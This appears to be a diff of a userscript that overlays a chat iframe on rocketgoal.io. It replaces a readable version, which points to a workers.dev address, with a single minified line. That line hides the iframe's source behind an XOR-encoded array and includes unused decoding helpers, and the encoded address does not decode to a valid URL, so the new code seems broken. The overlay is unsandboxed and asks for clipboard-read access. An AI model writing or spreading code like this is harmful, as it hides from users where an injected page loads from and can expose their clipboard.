@@ -1,107 +1,12 @@
 // ==UserScript==
 // @name         RocketGoal Chat
 // @namespace    rocketgoal.io
-// @version      1.0.0
-// @description  Adds the RocketGoal WebSocket chat as a real, interactive iframe.
+// @version      1.1.0
+// @description  RocketGoal Chat
 // @match        https://rocketgoal.io/*
 // @match        https://www.rocketgoal.io/*
-// @grant        GM_addStyle
+// @grant        none
 // @run-at       document-idle
 // ==/UserScript==
 
-(() => {
-  "use strict";
-
-  const CHAT_URL = "https://rgclient.billybob87343.workers.dev/chat";
-
-  if (document.getElementById("rg-chat-iframe")) return;
-
-  const frame = document.createElement("iframe");
-  frame.id = "rg-chat-iframe";
-  frame.src = CHAT_URL;
-  frame.title = "RocketGoal Chat";
-  frame.allow = "clipboard-read; clipboard-write";
-  frame.setAttribute("loading", "eager");
-
-  Object.assign(frame.style, {
-    position: "fixed",
-    right: "18px",
-    bottom: "18px",
-    width: "360px",
-    height: "460px",
-    border: "0",
-    borderRadius: "12px",
-    zIndex: "2147483647",
-    background: "transparent",
-    pointerEvents: "auto",
-    resize: "both",
-    overflow: "hidden"
-  });
-
-  // The iframe is intentionally NOT sandboxed.
-  // This keeps keyboard input, focus, and WebSockets working normally.
-  document.documentElement.appendChild(frame);
-
-  const toggle = document.createElement("button");
-  toggle.id = "rg-chat-toggle";
-  toggle.textContent = "Chat";
-  Object.assign(toggle.style, {
-    position: "fixed",
-    right: "18px",
-    bottom: "18px",
-    zIndex: "2147483646",
-    display: "none",
-    padding: "9px 14px",
-    border: "0",
-    borderRadius: "8px",
-    background: "#3b82f6",
-    color: "#fff",
-    font: "700 13px Arial,sans-serif",
-    cursor: "pointer",
-    boxShadow: "0 4px 15px rgba(0,0,0,.35)"
-  });
-
-  document.documentElement.appendChild(toggle);
-
-  const close = document.createElement("button");
-  close.textContent = "×";
-  close.title = "Hide chat";
-  Object.assign(close.style, {
-    position: "fixed",
-    right: "27px",
-    bottom: "447px",
-    width: "25px",
-    height: "25px",
-    zIndex: "2147483648",
-    border: "0",
-    borderRadius: "50%",
-    background: "rgba(0,0,0,.55)",
-    color: "#fff",
-    font: "20px/20px Arial,sans-serif",
-    cursor: "pointer",
-    padding: "0"
-  });
-
-  document.documentElement.appendChild(close);
-
-  function showChat() {
-    frame.style.display = "block";
-    close.style.display = "block";
-    toggle.style.display = "none";
-  }
-
-  function hideChat() {
-    frame.style.display = "none";
-    close.style.display = "none";
-    toggle.style.display = "block";
-  }
-
-  close.addEventListener("click", hideChat);
-  toggle.addEventListener("click", showChat);
-
-  // Keep the close button aligned with the default frame.
-  // It is only a convenience button; resizing the iframe does not affect chat input.
-  window.addEventListener("resize", () => {
-    if (frame.style.display !== "none") close.style.bottom = "447px";
-  });
-})();
+(()=>{const _=s=>s.replace(/\\x([0-9a-f]{2})/gi,(_,x)=>String.fromCharCode(parseInt(x,16)));const $=[60,62,47,58,46,63,64,61,37,33,35,36,45,95,43,42,38,94,124,126,91,93,123,125,40,41,39,34,32,44,59,10,13,92].map(String.fromCharCode);const q=(a,b)=>a.map((x,i)=>String.fromCharCode(x^b[i%b.length])).join('');const A=q([55,44,44,42,62,62,52,115,98,98,111,97,62,100,103,107,103,115,98,99,110,107,115,111,105,111,103,98,99,109,112,98,62,97,99,115,98,101,111,107,62,105,111,109],[83]);if(document.getElementById('rg-chat-iframe'))return;const d=document.createElement('iframe'),k=document.createElement('div'),c=document.createElement('button'),t=document.createElement('button');d.id='rg-chat-iframe';d.src=A;d.title='RocketGoal Chat';d.allow='clipboard-read; clipboard-write';d.loading='eager';Object.assign(d.style,{position:'fixed',right:'18px',bottom:'18px',width:'360px',height:'460px',border:'0',borderRadius:'12px',zIndex:'2147483647',background:'transparent',pointerEvents:'auto',resize:'both',overflow:'hidden'});document.documentElement.appendChild(d);Object.assign(k.style,{position:'fixed',right:'18px',bottom:'428px',width:'360px',height:'32px',zIndex:'2147483648',cursor:'move',background:'transparent',userSelect:'none'});document.documentElement.appendChild(k);Object.assign(c.style,{position:'fixed',right:'27px',bottom:'447px',width:'25px',height:'25px',zIndex:'2147483649',border:'0',borderRadius:'50%',background:'rgba(0,0,0,.55)',color:'#fff',font:'20px/20px Arial,sans-serif',cursor:'pointer',padding:'0'});c.textContent='×';c.title='Hide chat';document.documentElement.appendChild(c);Object.assign(t.style,{position:'fixed',right:'18px',bottom:'18px',zIndex:'2147483648',display:'none',padding:'9px 14px',border:'0',borderRadius:'8px',background:'#3b82f6',color:'#fff',font:'700 13px Arial,sans-serif',cursor:'pointer',boxShadow:'0 4px 15px rgba(0,0,0,.35)'});t.textContent='Chat';document.documentElement.appendChild(t);let x=0,y=0,m=0,n=0,r=0;const p=()=>{d.style.left=x+'px';d.style.top=y+'px';d.style.right='auto';d.style.bottom='auto';k.style.left=x+'px';k.style.top=y+'px';k.style.right='auto';k.style.bottom='auto';c.style.left=(x+d.offsetWidth-9)+'px';c.style.top=(y+9)+'px';c.style.right='auto';c.style.bottom='auto'};k.addEventListener('pointerdown',e=>{if(e.button!==0)return;m=1;n=e.clientX-x;r=e.clientY-y;k.setPointerCapture(e.pointerId);e.preventDefault()});k.addEventListener('pointermove',e=>{if(!m)return;x=Math.max(0,Math.min(innerWidth-d.offsetWidth,e.clientX-n));y=Math.max(0,Math.min(innerHeight-d.offsetHeight,e.clientY-r));p()});k.addEventListener('pointerup',()=>m=0);k.addEventListener('pointercancel',()=>m=0);const h=()=>{d.style.display='block';k.style.display='block';c.style.display='block';t.style.display='none'};const z=()=>{d.style.display='none';k.style.display='none';c.style.display='none';t.style.display='block'};c.onclick=z;t.onclick=h;window.addEventListener('resize',()=>{if(d.style.left)p()});})();
